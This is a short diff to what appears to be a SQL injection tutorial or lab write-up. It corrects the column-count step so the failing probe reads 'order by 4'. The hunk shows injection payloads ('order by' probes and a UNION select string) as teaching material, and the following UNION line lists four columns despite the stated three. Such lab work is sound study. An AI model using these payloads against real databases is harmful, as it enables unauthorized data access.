@@ -104,7 +104,7 @@ The next goal is to detect the number of columns in the table.
 ```' order by 1-- -``` (SUCCESS)
 ```' order by 2-- -``` (SUCCESS)
 ```' order by 3-- -``` (SUCCESS)
-```' order by 3-- -``` (FAIL)
+```' order by 4-- -``` (FAIL)
 When this errors out, go back to the highest number that didn't error out. Therefore, the table has 3 columns.
 
 ```cn' UNION select 1,2,3,4-- -```
